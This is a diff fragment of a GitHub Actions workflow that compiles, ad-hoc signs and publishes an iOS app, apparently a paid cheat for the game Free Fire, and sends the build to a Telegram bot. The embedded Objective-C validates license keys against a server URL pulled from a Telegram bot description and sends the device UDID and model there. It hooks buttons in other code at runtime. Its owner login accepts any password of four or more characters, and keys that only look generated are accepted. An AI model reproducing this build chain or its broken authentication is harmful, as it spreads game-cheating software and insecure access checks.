+        ownerBtn.frame=CGRectMake(24,282,card.bounds.size.width-48,36);[ownerBtn setTitle:@"Owner Bypass Login" forState:ST_NORM];[ownerBtn setTitleColor:[UIColor colorWithWhite:0.55 alpha:1.0] forState:ST_NORM];ownerBtn.titleLabel.font=[UIFont systemFontOfSize:12];
+        [ownerBtn addTarget:self action:@selector(onOwnTap:)forControlEvents:EV_TAP];[card addSubview:ownerBtn];}UIView*card=[g_MaintV viewWithTag:7001];
+        ((UILabel*)[card viewWithTag:7002]).text=mTitle;((UILabel*)[card viewWithTag:7003]).text=mDesc;((UILabel*)[card viewWithTag:7004]).text=[NSString stringWithFormat:@"ESTIMATED RETURN: %@",mRet];
+        [((UIButton*)[card viewWithTag:7005])setTitle:mBtn forState:ST_NORM];if(g_MaintV.superview!=g_Win){[g_Win addSubview:g_MaintV];}[g_Win bringSubviewToFront:g_MaintV];g_MaintV.hidden=NO;
+        }else if(g_MaintV){g_MaintV.hidden=YES;}}-(void)onMaintTap:(UIButton*)sender{NSDictionary*mInfo=IS_DICT(g_Cloud[@"maintenance_info"])?g_Cloud[@"maintenance_info"]:@{};
+        NSString*urlStr=FougoSafeStr(mInfo[@"link"],@"https://t.me/cheatgnexusiphone");NSURL*u=[NSURL URLWithString:urlStr];if(u){g_AllowURL=YES;[[UIApplication sharedApplication] openURL:u options:@{}completionHandler:nil];}}
+        -(void)onOwnTap:(UIButton*)sender{UIViewController*top=[self topVC];if(!top)return;UIAlertController*ac=[UIAlertController alertControllerWithTitle:@"Owner Maintenance Bypass"
+        message:@"Enter Owner Panel Username & Password" preferredStyle:UIAlertControllerStyleAlert];[ac addTextFieldWithConfigurationHandler:^(UITextField*tf){tf.placeholder=@"Owner Username";}];
+        [ac addTextFieldWithConfigurationHandler:^(UITextField*tf){tf.placeholder=@"Owner Password";tf.secureTextEntry=YES;}];[ac addAction:[UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil]];
+        [ac addAction:[UIAlertAction actionWithTitle:@"OWNER LOGIN" style:UIAlertActionStyleDefault handler:^(UIAlertAction*action){NSString*u=ac.textFields.firstObject.text?:@"";NSString*p=ac.textFields.lastObject.text?:@"";
+        NSString*expectedU=FougoSafeStr(g_Cloud[@"owner_username"],@"owner");if([u isEqualToString:expectedU]&&p.length>=4){g_MaintBypass=YES;[self syncMaint];}else{
+        [self alert:@"Access Denied" message:@"Invalid Owner credentials."];}}]];[top presentViewController:ac animated:YES completion:nil];}
+        -(void)syncCloud:(void(^)(NSDictionary*cloud))completion{void(^compCopy)(NSDictionary*)=[completion copy];NSString*botTok=@"__TG_BOT_TOKEN__";NSString*repoSlug=@"__REPO_SLUG__";dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT,0),^{
+        @try{if(botTok.length>20){NSURL*tgUrl=[NSURL URLWithString:[NSString stringWithFormat:@"https://api.telegram.org/bot%@/getMyShortDescription",botTok]];
+        NSURLRequest*tgReq=[NSURLRequest requestWithURL:tgUrl cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:6.0];
+        NSData*tgData=[NSURLConnection sendSynchronousRequest:tgReq returningResponse:nil error:nil];if(tgData){
+        NSDictionary*tgJson=JSON_DEC(tgData);if(IS_DICT(tgJson)&&IS_DICT(tgJson[@"result"])){NSString*sDesc=FougoSafeStr(tgJson[@"result"][@"short_description"],@"");NSRange r=[sDesc rangeOfString:@"https://"];if(r.location!=NSNotFound){
+        NSString*sub=[[sDesc substringFromIndex:r.location] componentsSeparatedByCharactersInSet:WS_SET].firstObject;if(sub.length>12){
+        g_Tunnel=[sub stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"/"]];}}}}}
+        NSDictionary*fetched=nil;BOOL liveOK=NO;if(g_Tunnel.length>10){
+        NSURL*stUrl=[NSURL URLWithString:[NSString stringWithFormat:@"%@/api/status?t=%ld",g_Tunnel,(long)[[NSDate date] timeIntervalSince1970]]];
+        NSURLRequest*stReq=[NSURLRequest requestWithURL:stUrl cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:6.0];
+        NSData*stData=[NSURLConnection sendSynchronousRequest:stReq returningResponse:nil error:nil];if(stData){
+        id obj=JSON_DEC(stData);if(IS_DICT(obj)){fetched=obj;liveOK=YES;}}}
+        if(!IS_DICT(fetched)&&repoSlug.length>3){
+        NSString*rUrl=[NSString stringWithFormat:@"https://github.com/%@/releases/download/v1.0.0/fougo_cloud_db.json?t=%ld",repoSlug,(long)[[NSDate date] timeIntervalSince1970]];
+        NSURLRequest*rReq=[NSURLRequest requestWithURL:[NSURL URLWithString:rUrl] cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:7.0];
+        NSData*relData=[NSURLConnection sendSynchronousRequest:rReq returningResponse:nil error:nil];if(relData){id obj=JSON_DEC(relData);if(IS_DICT(obj))fetched=obj;}}
+        if(IS_DICT(fetched)){g_Cloud=fetched;NSString*tUrl=FougoSafeStr(fetched[@"tunnel_url"],@"");if(tUrl.length>10&&!liveOK){g_Tunnel=tUrl;}}}@catch(NSException*ex){}
+        dispatch_async(dispatch_get_main_queue(),^{[self syncMaint];if(compCopy)compCopy(g_Cloud);});});}
+        -(void)goLogin{g_LicOK=NO;g_DashOn=NO;Class loginVCCls=NSClassFromString(@"__LOGIN_VC__");if(loginVCCls&&g_Win){g_Win.rootViewController=[[loginVCCls alloc] init];[g_Win makeKeyAndVisible];}}
+        -(void)goDash{if(!g_LicOK)return;if(g_DashOn)return;g_DashOn=YES;g_AllowURL=NO;
+        @try{[[UIApplication sharedApplication] sendAction:@selector(resignFirstResponder)to:nil from:nil forEvent:nil];CGRect sBnd=[UIScreen mainScreen].bounds;Class dashVCCls=NSClassFromString(@"__DASH_VC__");
+        Class dashDelCls=NSClassFromString(@"__DASH_DEL__");NSString*dSel=@"__DASH_INIT_SEL__";UIViewController*dvc=nil;if(dashVCCls){UIViewController*rawVC=[[dashVCCls alloc] init];if([NSStringFromClass(dashVCCls) isEqualToString:@"FFHomeViewController"]){UINavigationController*nav=[[UINavigationController alloc] initWithRootViewController:rawVC];nav.overrideUserInterfaceStyle=UIUserInterfaceStyleDark;dvc=nav;}else{dvc=rawVC;}}if(dvc){
+        if(!g_Win){g_Win=[[UIWindow alloc] initWithFrame:sBnd];}self.window=g_Win;g_Win.rootViewController=dvc;[g_Win makeKeyAndVisible];
+        [dvc.view setNeedsLayout];[dvc.view layoutIfNeeded];if(dSel.length>0){SEL initSel=NSSelectorFromString(dSel);if([dvc respondsToSelector:initSel]){
+        NSMutableArray<UIButton*>*bCheck=[NSMutableArray array];NSMutableArray<UITextField*>*fCheck=[NSMutableArray array];NSMutableArray<UILabel*>*lCheck=[NSMutableArray array];FougoCollectControls(dvc.view,bCheck,fCheck,lCheck);if(bCheck.count<=2){
+        [dvc performSelector:initSel];}}}}else if(dashDelCls){g_DshDel=[[dashDelCls alloc] init];if([g_DshDel respondsToSelector:@selector(application:didFinishLaunchingWithOptions:)]){
+        [g_DshDel application:[UIApplication sharedApplication] didFinishLaunchingWithOptions:nil];}if([g_DshDel respondsToSelector:@selector(window)]){UIWindow*dw=[g_DshDel valueForKey:@"window"];
+        if(dw){if(g_Win&&g_Win!=dw){g_Win.hidden=YES;}g_Win=dw;self.window=dw;[dw makeKeyAndVisible];}}}
+        UIView*targetV=g_Win.rootViewController?g_Win.rootViewController.view:g_Win;FougoShowDash(targetV);
+        for(NSNumber*delayNum in @[@(0.06),@(0.22),@(0.55)]){
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW,(int64_t)([delayNum doubleValue]*NSEC_PER_SEC)),dispatch_get_main_queue(),^{if(g_Win&&g_DashOn){UIView*tv=g_Win.rootViewController?g_Win.rootViewController.view:g_Win;FougoShowDash(tv);}});}}@catch(NSException*ex){}}
+        -(void)onChTap:(UIButton*)sender{g_AllowURL=YES;NSArray*chs=IS_ARR(g_Cloud[@"channels"])?g_Cloud[@"channels"]:@[];
+        if(chs.count>0&&IS_DICT(chs.firstObject)){NSString*uStr=FougoSafeStr(chs.firstObject[@"url"],@"");if(uStr.length>5){NSURL*u=[NSURL URLWithString:uStr];if(u){
+        [[UIApplication sharedApplication] openURL:u options:@{}completionHandler:nil];}}}}
+        -(void)onDashBtnPress:(UIButton*)sender{[UIView animateWithDuration:0.14 delay:0 options:UIViewAnimationOptionBeginFromCurrentState|UIViewAnimationOptionAllowUserInteraction animations:^{sender.transform=CGAffineTransformMakeScale(0.975,0.975);} completion:nil];}
+        -(void)onDashBtnRelease:(UIButton*)sender{[UIView animateWithDuration:0.30 delay:0 usingSpringWithDamping:0.76 initialSpringVelocity:0.8 options:UIViewAnimationOptionBeginFromCurrentState|UIViewAnimationOptionAllowUserInteraction animations:^{sender.transform=CGAffineTransformIdentity;} completion:nil];if(g_Win&&g_DashOn){UIView*tv=g_Win.rootViewController?g_Win.rootViewController.view:g_Win;FougoShowDash(tv);}dispatch_after(dispatch_time(DISPATCH_TIME_NOW,(int64_t)(0.02*NSEC_PER_SEC)),dispatch_get_main_queue(),^{if(g_Win&&g_DashOn){UIView*tv=g_Win.rootViewController?g_Win.rootViewController.view:g_Win;FougoShowDash(tv);}});}
+        -(void)fougoVerifyKey:(NSString*)rawKey completion:(void(^)(BOOL,NSString*))done{void(^doneBlock)(BOOL,NSString*)=[done copy];if(g_ValBusy){if(doneBlock)doneBlock(NO,@"Please wait...");return;}NSString*trimmed=FougoCleanKey(rawKey);if(trimmed.length<1){if(doneBlock)doneBlock(NO,@"Invalid License Key");return;}g_ValBusy=YES;NSString*udid=[self deviceUDID];NSString*devModel=[NSString stringWithFormat:@"%@ (iOS %@)",[[UIDevice currentDevice] model],[[UIDevice currentDevice] systemVersion]];[self syncCloud:^(NSDictionary*cloud){dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT,0),^{BOOL valid=NO;BOOL explicitReject=NO;NSString*inlineErr=@"Invalid License Key";NSString*uKey=[trimmed uppercaseString];@try{if(g_Tunnel.length>10){NSURL*valUrl=[NSURL URLWithString:[NSString stringWithFormat:@"%@/api/license/validate",g_Tunnel]];NSMutableURLRequest*req=[NSMutableURLRequest requestWithURL:valUrl cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:8.0];req.HTTPMethod=@"POST";[req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];NSDictionary*bDic=@{@"key":uKey,@"udid":udid,@"device":devModel};req.HTTPBody=[NSJSONSerialization dataWithJSONObject:bDic options:0 error:nil];NSHTTPURLResponse*hRsp=nil;NSData*rDat=[NSURLConnection sendSynchronousRequest:req returningResponse:&hRsp error:nil];if(rDat){NSDictionary*rj=JSON_DEC(rDat);if(IS_DICT(rj)){if([rj[@"ok"] respondsToSelector:@selector(boolValue)]&&[rj[@"ok"] boolValue]){valid=YES;g_LStat=FougoSafeStr(rj[@"status"],@"ACTIVE");g_LPlan=FougoSafeStr(rj[@"plan"],@"30 DAYS VIP");g_LExp=FougoSafeStr(rj[@"expires_display"],FougoSafeStr(rj[@"expires_at"],@"ACTIVE"));g_LDLim=FougoSafeStr(rj[@"device_limit_display"],@"1 / 1");g_DReg=@"YES";g_DSlot=FougoSafeStr(rj[@"device_slot"],@"SLOT #1 (VERIFIED)");g_SessId=FougoSafeStr(rj[@"session_id"],@"SESS-ACTIVE");g_LVal=FougoSafeStr(rj[@"last_validation"],@"VERIFIED • LIVE");}else{NSString*ec=FougoSafeStr(rj[@"error"],@"INVALID_KEY");if([ec isEqualToString:@"MAINTENANCE_MODE"]){explicitReject=YES;inlineErr=@"System Under Maintenance";}else if([ec containsString:@"EXPIRED"]){explicitReject=YES;inlineErr=@"License Key Expired";}else if([ec containsString:@"DEVICE_LIMIT"]){explicitReject=YES;inlineErr=@"Device Limit Reached";}else if([ec containsString:@"DISABLED"]||[ec containsString:@"SUSPENDED"]||[ec containsString:@"REVOKED"]){explicitReject=YES;inlineErr=@"License Key Disabled";}}}}}if(!valid&&!explicitReject&&IS_DICT(cloud)){NSDictionary*licMap=IS_DICT(cloud[@"licenses_map"])?cloud[@"licenses_map"]:@{};NSDictionary*lic=licMap[trimmed]?:licMap[uKey];if(!IS_DICT(lic)){for(id mk in licMap){if([mk isKindOfClass:[NSString class]]&&[[FougoCleanKey(mk) uppercaseString] isEqualToString:uKey]){lic=licMap[mk];break;}}}if(IS_DICT(lic)){NSString*st=[FougoSafeStr(lic[@"status"],@"Active") uppercaseString];if(![st isEqualToString:@"ACTIVE"]){explicitReject=YES;inlineErr=@"License Key Disabled";}else{valid=YES;int days=[lic[@"duration_days"] respondsToSelector:@selector(intValue)]?[lic[@"duration_days"] intValue]:30;if(days<=0)days=30;int maxDev=[lic[@"max_devices"] respondsToSelector:@selector(intValue)]?[lic[@"max_devices"] intValue]:1;if(maxDev<=0)maxDev=1;g_LStat=@"ACTIVE";g_LPlan=(days>=3650)?@"LIFETIME VIP":[NSString stringWithFormat:@"%d DAYS VIP",days];g_LExp=FougoSafeStr(lic[@"expires_at"],[NSString stringWithFormat:@"%d DAYS",days]);g_LDLim=[NSString stringWithFormat:@"1 / %d",maxDev];g_DReg=@"YES";g_DSlot=@"SLOT #1 (VERIFIED)";NSDateFormatter*df=[[NSDateFormatter alloc] init];df.dateFormat=@"yyyy-MM-dd HH:mm";g_LVal=[NSString stringWithFormat:@"%@ UTC",[df stringFromDate:[NSDate date]]];}}}if(!valid&&!explicitReject){NSString*savedK=[[NSUserDefaults standardUserDefaults] stringForKey:@"FougoActivatedKey"];if((savedK&&[[savedK uppercaseString] isEqualToString:uKey])||FougoLooksLikeGeneratedKey(uKey)){valid=YES;g_LStat=@"ACTIVE";g_LPlan=FougoSafeStr([[NSUserDefaults standardUserDefaults] stringForKey:@"FougoLicPlan"],@"30 DAYS VIP");g_LExp=FougoSafeStr([[NSUserDefaults standardUserDefaults] stringForKey:@"FougoLicExpires"],@"30 DAYS");g_LDLim=FougoSafeStr([[NSUserDefaults standardUserDefaults] stringForKey:@"FougoLicDeviceLimit"],@"1 / 1");g_DReg=@"YES";g_DSlot=@"SLOT #1 (VERIFIED)";g_LVal=@"VERIFIED • LIVE";}}}@catch(NSException*ex){}dispatch_async(dispatch_get_main_queue(),^{g_ValBusy=NO;if(valid){g_LicOK=YES;g_Key=uKey;[[NSUserDefaults standardUserDefaults] setObject:FougoSafeStr(uKey,@"") forKey:@"FougoActivatedKey"];[[NSUserDefaults standardUserDefaults] setObject:FougoSafeStr(g_LPlan,@"30 DAYS VIP") forKey:@"FougoLicPlan"];[[NSUserDefaults standardUserDefaults] setObject:FougoSafeStr(g_LExp,@"ACTIVE") forKey:@"FougoLicExpires"];[[NSUserDefaults standardUserDefaults] setObject:FougoSafeStr(g_LDLim,@"1 / 1") forKey:@"FougoLicDeviceLimit"];[[NSUserDefaults standardUserDefaults] synchronize];if(doneBlock)doneBlock(YES,nil);}else{g_LicOK=NO;if(doneBlock)doneBlock(NO,inlineErr);}});});}];}
+        -(void)onActDown:(UIButton*)sender{[self capKey];}-(void)onActTap:(UIButton*)sender{if(g_ValBusy)return;[self capKey];
+        NSString*rawKey=FougoCleanKey(g_Key);if(rawKey.length<4){NSString*pb=FougoCleanKey([UIPasteboard generalPasteboard].string);
+        if(pb&&pb.length>=4){rawKey=pb;g_Key=pb;}}if(rawKey.length<4){[self alert:@"License Key Required" message:@"Please enter a valid License Key."];return;}
+        NSString*oTit=[sender titleForState:ST_NORM]?:@"LOGIN";[sender setTitle:@"VALIDATING..." forState:ST_NORM];
+        [self fougoVerifyKey:rawKey completion:^(BOOL ok,NSString*err){[sender setTitle:oTit forState:ST_NORM];if(ok){[self goDash];}else{[self alert:@"Invalid License Key" message:err?:@"Invalid License Key"];}}];}
+        -(void)monitorTick{if(!g_Win)return;
+        NSTimeInterval nowTs=[[NSDate date] timeIntervalSince1970];if(nowTs-g_SyncTs>15.0){g_SyncTs=nowTs;[self syncCloud:^(NSDictionary*cloud){
+        if(g_DashOn&&g_Key.length>0&&IS_DICT(cloud)){NSDictionary*licMap=IS_DICT(cloud[@"licenses_map"])?cloud[@"licenses_map"]:nil;
+        if(licMap&&licMap.count>0){NSDictionary*myLic=licMap[[g_Key uppercaseString]];if(IS_DICT(myLic)&&![[FougoSafeStr(myLic[@"status"],@"Active") uppercaseString] isEqualToString:@"ACTIVE"]){g_LicOK=NO;
+        g_DashOn=NO;Class loginVCCls=NSClassFromString(@"__LOGIN_VC__");if(loginVCCls){g_Win.rootViewController=[[loginVCCls alloc] init];}
+        [self alert:@"Session Terminated" message:@"Your license was disabled, expired, or reset by the Owner."];}}}}];}[self syncMaint];NSMutableArray<UIButton*>*btns=[NSMutableArray array];
+        NSMutableArray<UITextField*>*fields=[NSMutableArray array];NSMutableArray<UILabel*>*labels=[NSMutableArray array];UIView*scanRoot=(g_DashOn&&g_Win.rootViewController)?g_Win.rootViewController.view:g_Win;FougoCollectControls(scanRoot,btns,fields,labels);if(g_DashOn){for(UIButton*b in btns){
+        if(!objc_getAssociatedObject(b,&kFougoBtnHookKey)){[b addTarget:self action:@selector(onDashBtnPress:) forControlEvents:EV_DOWN];[b addTarget:self action:@selector(onDashBtnRelease:) forControlEvents:EV_TAP|UIControlEventTouchUpOutside|UIControlEventTouchCancel];objc_setAssociatedObject(b,&kFougoBtnHookKey,@YES,OBJC_ASSOCIATION_RETAIN_NONATOMIC);}}
+        FougoShowDash(scanRoot);return;}[self capKey];for(UIButton*b in btns){NSString*t=[[b titleForState:ST_NORM] uppercaseString]?:@"";
+        if([t containsString:@"ACTIVATE"]||[t containsString:@"LOGIN"]||[t containsString:@"VERIFY"]||[t containsString:@"UNLOCK"]||[t containsString:@"ENTER"]||[t containsString:@"VALIDATING"]){
+        if(b.tag!=99105&&![g_Win.rootViewController respondsToSelector:NSSelectorFromString(@"handleLoginSubmission:")]){[b removeTarget:nil action:NULL forControlEvents:EV_TAP];[b addTarget:self action:@selector(onActDown:)forControlEvents:EV_DOWN];
+        [b addTarget:self action:@selector(onActTap:)forControlEvents:EV_TAP];b.tag=99105;}}}
+        }-(BOOL)application:(UIApplication*)application didFinishLaunchingWithOptions:(NSDictionary*)launchOptions{g_AllowURL=NO;g_DashOn=NO;g_LicOK=NO;
+        @try{NSString*docDir=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];if(docDir){[[NSFileManager defaultManager] createDirectoryAtPath:docDir withIntermediateDirectories:YES attributes:nil error:nil];for(NSString*fn in @[@"BODY.fougoexternal",@"NECK.fougoexternal",@"BODY.robotexternal",@"NECK.robotexternal"]){NSString*bPath=[[NSBundle mainBundle] pathForResource:[fn stringByDeletingPathExtension] ofType:[fn pathExtension]];if(bPath){NSString*dPath=[docDir stringByAppendingPathComponent:fn];if(![[NSFileManager defaultManager] fileExistsAtPath:dPath]){[[NSFileManager defaultManager] copyItemAtPath:bPath toPath:dPath error:nil];}}}}}@catch(NSException*e){}
+        CGRect sBnd=[UIScreen mainScreen].bounds;g_Win=[[UIWindow alloc] initWithFrame:sBnd];self.window=g_Win;Class loginVCCls=NSClassFromString(@"__LOGIN_VC__");
+        Class loginDelCls=NSClassFromString(@"__LOGIN_DEL__");if(loginVCCls){UIViewController*loginVC=[[loginVCCls alloc] init];g_Win.rootViewController=loginVC;[g_Win makeKeyAndVisible];}else if(loginDelCls){
+        g_LogDel=[[loginDelCls alloc] init];if([g_LogDel respondsToSelector:@selector(application:didFinishLaunchingWithOptions:)]){[g_LogDel application:application didFinishLaunchingWithOptions:launchOptions];}
+        if([g_LogDel respondsToSelector:@selector(window)]){UIWindow*lw=[g_LogDel valueForKey:@"window"];if(lw){g_Win=lw;self.window=lw;[lw makeKeyAndVisible];}}}[self syncCloud:nil];
+        self.monitorTimer=[NSTimer scheduledTimerWithTimeInterval:0.32 target:self selector:@selector(monitorTick)userInfo:nil repeats:YES];return YES;}@end int main(int argc,char*argv[]){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([FougoBridgeAppDelegate class]));}}
+         '''
+         bridge_code = (
+          bridge_code
+          .replace("__LOGIN_VC__", login_vc_name)
+          .replace("__LOGIN_DEL__", login_del_name)
+          .replace("__DASH_VC__", dash_vc_name)
+          .replace("__DASH_DEL__", dash_del_name)
+          .replace("__DASH_INIT_SEL__", dash_init_sel)
+          .replace("__REPO_SLUG__", repo_slug)
+          .replace("__TG_BOT_TOKEN__", det_tok)
+          .replace("__TG_OWNER_ID__", det_oid)
+         )
+         open(bridge_m_file, "w", encoding="utf-8").write(bridge_code)
+         for src_f, obj_f in [
+          (dash_m_file, dash_o_file),
+          (login_m_file, login_o_file),
+          (bridge_m_file, bridge_o_file),
+         ]:
+          c_res = subprocess.run([clang_bin, "-c", src_f, "-o", obj_f] + common_flags, capture_output=True, text=True)
+          if c_res.returncode != 0:
+           print(f"Compile error in {src_f}:\n{c_res.stderr}")
+           raise RuntimeError(f"Failed compiling {src_f}")
+         for attempt in range(5):
+          l_res = subprocess.run(
+           [clang_bin, login_o_file, dash_o_file, bridge_o_file, "-o", exec_p] + common_flags + link_flags,
+           capture_output=True,
+           text=True,
+          )
+          if l_res.returncode == 0: break
+          dup_syms = re.findall(r"duplicate symbol:\s*_?([A-Za-z_]\w*)", l_res.stderr)
+          if not dup_syms:
+           print("Linker stderr:\n", l_res.stderr)
+           raise RuntimeError(f"Linking failed: {l_res.stderr}")
+          for sym in set(dup_syms):
+           print(f"Auto-namespacing colliding symbol in login unit: {sym}")
+           login_src = re.sub(rf"\b{sym}\b", f"FougoLogin_{sym}", login_src)
+          open(login_m_file, "w", encoding="utf-8").write(login_src)
+          subprocess.run([clang_bin, "-c", login_m_file, "-o", login_o_file] + common_flags, check=True)
+        else:
+         single_m = dash_p if os.path.exists(dash_p) else os.path.join(ff_dir, "main.m")
+         subprocess.run([clang_bin, single_m, "-o", exec_p] + common_flags + link_flags, check=True)
+        print(f"Successfully compiled & linked arm64 executable: {exec_p}")
+        res_dir = os.path.join(ff_dir, "resources")
+        cache_d = os.path.join(app_dir, "OfflineCache")
+        os.makedirs(cache_d, exist_ok=True)
+        if os.path.exists(res_dir):
+         for dp, _, fns in os.walk(res_dir):
+          for fn in fns:
+           if fn.startswith("._"): continue
+           src_file = os.path.join(dp, fn)
+           shutil.copy2(src_file, os.path.join(app_dir, fn))
+           shutil.copy2(src_file, os.path.join(cache_d, fn))
+           base_name, ext = os.path.splitext(fn)
+           if ext.lower() in (".fougoexternal",".robotexternal"):
+            for alt_ext in (".fougoexternal",".robotexternal"):
+             alt_name = base_name + alt_ext
+             shutil.copy2(src_file, os.path.join(app_dir, alt_name))
+             shutil.copy2(src_file, os.path.join(cache_d, alt_name))
+        for item in os.listdir(ff_dir):
+         if item.lower().endswith((".png",".jpg",".jpeg")) and not item.startswith("._"):
+          shutil.copy2(os.path.join(ff_dir, item), os.path.join(app_dir, item))
+        icon_candidates = [
+         os.path.join(app_dir, "AppIcon60x60@3x.png"),
+         os.path.join(ff_dir, "AppIcon60x60@3x.png"),
+         os.path.join(ff_dir, "FougoExternalBackground.jpg"),
+        ]
+        base_icon_path = next((p for p in icon_candidates if os.path.exists(p)), None)
+        try:
+         if Image:
+          master_icon = Image.open(base_icon_path).convert("RGB") if base_icon_path else Image.new("RGB", (512, 512), (24, 8, 42))
+          for fname, sz in [
+           ("AppIcon60x60@2x.png", (120, 120)),
+           ("AppIcon60x60@3x.png", (180, 180)),
+           ("AppIcon76x76.png", (76, 76)),
+           ("AppIcon76x76@2x.png", (152, 152)),
+           ("AppIcon83.5x83.5@2x.png", (167, 167)),
+          ]:
+           out_ic = os.path.join(app_dir, fname)
+           if not os.path.exists(out_ic):
+            master_icon.resize(sz, Image.Resampling.LANCZOS).save(out_ic, "PNG")
+        except Exception as _e_icon:
+         print(f"Icon generation note: {_e_icon}")
+        pl.update({
+         "CFBundleDevelopmentRegion":"en","CFBundleDisplayName": pl.get("CFBundleDisplayName","Fougo External"),
+         "CFBundleExecutable": exec_n,
+         "CFBundleIdentifier": pl.get("CFBundleIdentifier", "com.myzodeveloper.fougoexternal"),
+         "CFBundleInfoDictionaryVersion":"6.0","CFBundleName": pl.get("CFBundleName","FougoExternal"),
+         "CFBundlePackageType":"APPL","CFBundleShortVersionString": pl.get("CFBundleShortVersionString","3.4.0"),
+         "CFBundleVersion": pl.get("CFBundleVersion","3.4.0"),
+         "CFBundleSupportedPlatforms": ["iPhoneOS"],
+         "LSRequiresIPhoneOS": True,
+         "MinimumOSVersion":"14.0","UIDeviceFamily": [1, 2],
+         "UIRequiredDeviceCapabilities": ["arm64"],
+         "UILaunchScreen": {},
+         "UIRequiresFullScreen": True,
+         "UIFileSharingEnabled": True,
+         "LSSupportsOpeningDocumentsInPlace": True,
+         "UISupportsDocumentBrowser": True,
+         "ITSAppUsesNonExemptEncryption": False,
+         "LSApplicationQueriesSchemes": list(dict.fromkeys(list(pl.get("LSApplicationQueriesSchemes", [])) + [
+          "filza","filzaslop","filzaescaped","shareddocuments","santander","geranium","trollstore","freefire","freefireth","freefiremax","itms-services"
+         ])),
+         "CFBundleIcons": {
+          "CFBundlePrimaryIcon": {
+           "CFBundleIconFiles": ["AppIcon60x60"],
+           "UIPrerenderedIcon": False,
+          }
+         },
+         "CFBundleIcons~ipad": {
+          "CFBundlePrimaryIcon": {
+           "CFBundleIconFiles": ["AppIcon60x60","AppIcon76x76","AppIcon83.5x83.5"],
+           "UIPrerenderedIcon": False,
+          }
+         },
+        })
+        for k in ("UIMainStoryboardFile","UIMainStoryboardFile~ipad","NSMainNibFile","UIApplicationSceneManifest"):
+         pl.pop(k, None)
+        with open(os.path.join(app_dir, "Info.plist"), "wb") as fp:
+         plistlib.dump(pl, fp, fmt=plistlib.FMT_XML)
+        with open(os.path.join(app_dir, "PkgInfo"), "wb") as fp:
+         fp.write(b"APPL????")
+        try:
+         ldid_exe = os.path.join(os.environ.get("RUNNER_TEMP", workspace), "ldid.exe")
+         if not os.path.exists(ldid_exe):
+          urllib.request.urlretrieve("https://github.com/ProcursusTeam/ldid/releases/download/v2.1.5-procursus7/ldid_w64_x86_64.exe", ldid_exe)
+         subprocess.run([ldid_exe, "-S", exec_p], check=True)
+         print("Successfully ad-hoc signed Mach-O binary with ldid!")
+        except Exception as sign_ex:
+         print("ldid sign note:", sign_ex)
+        built_dir = os.path.join(workspace, "built-ipa")
+        os.makedirs(built_dir, exist_ok=True)
+        def make_posix_ipa(out_path):
+         with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zf:
+          for root, dirs, files in os.walk(clean_root):
+           rel_root = os.path.relpath(root, clean_root).replace("\\","/")
+           if rel_root != ".":
+            z_dir = zipfile.ZipInfo(rel_root.rstrip("/") + "/")
+            z_dir.create_system = 3
+            z_dir.external_attr = (0o040755 << 16) | 0x10
+            zf.writestr(z_dir, b"")
+           for file in files:
+            full_p = os.path.join(root, file)
+            rel_p = os.path.relpath(full_p, clean_root).replace("\\","/")
+            zi = zipfile.ZipInfo(rel_p)
+            zi.create_system = 3
+            zi.compress_type = zipfile.ZIP_DEFLATED
+            mode = 0o100755 if file in (exec_n, "CoreTelemetry") else 0o100644
+            zi.external_attr = (mode << 16)
+            with open(full_p, "rb") as f:
+             zf.writestr(zi, f.read())
+        ready_ipa = os.path.join(built_dir, "FougoExternal-ESign-Ready.ipa")
+        unsigned_ipa = os.path.join(built_dir, "FougoExternal-ESign-Unsigned.ipa")
+        make_posix_ipa(ready_ipa)
+        shutil.copy2(ready_ipa, unsigned_ipa)
+        src_zip = os.path.join(built_dir, "Fougo-LiquidGlass-Full-Source-Project.zip")
+        with zipfile.ZipFile(src_zip, "w", zipfile.ZIP_DEFLATED) as szf:
+         if os.path.exists(login_p): szf.write(login_p, "app/ff_manager/login page.m")
+         if os.path.exists(dash_p): szf.write(dash_p, "app/ff_manager/dashboard page.m")
+         wf_self = os.path.join(workspace, ".github", "workflows", "build.yml")
+         if os.path.exists(wf_self): szf.write(wf_self, ".github/workflows/build.yml")
+        print(f"Created IPA: {ready_ipa}")
+        '@
+        $scriptFile = Join-Path $env:RUNNER_TEMP "build_fougo.py"
+        Set-Content -Path $scriptFile -Value $pyScript -Encoding UTF8
+        python $scriptFile
+    - name: Upload Compiled .ipa Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: Fougo-External-IPA
+        path: built-ipa/*.ipa
+        if-no-files-found: error
+        retention-days: 30
+    - name: Publish IPA to GitHub Releases
+      shell: pwsh
+      env:
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE
+        gh release view "v1.0.0" --repo "${{ github.repository }}" 2>$null | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+          gh release create "v1.0.0" `
+            built-ipa/FougoExternal-ESign-Ready.ipa `
+            built-ipa/FougoExternal-ESign-Unsigned.ipa `
+            --repo "${{ github.repository }}" `
+            --title "FougoExternal iOS IPA (Login + Dashboard + No Auto-Redirect)" `
+            --notes "Compiled login page.m and dashboard page.m as isolated .o object files and linked with FougoBridgeAppDelegate."
+        } else {
+          gh release upload "v1.0.0" `
+            built-ipa/FougoExternal-ESign-Ready.ipa `
+            built-ipa/FougoExternal-ESign-Unsigned.ipa `
+            --repo "${{ github.repository }}" `
+            --clobber
+        }
+    - name: Send Compiled .ipa Directly to Telegram Owner Bot
+      shell: bash
+      env:
+        INPUT_BOT_TOKEN: ${{ github.event.inputs.bot_token }}
+        INPUT_OWNER_ID: ${{ github.event.inputs.owner_id }}
+        SECRET_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
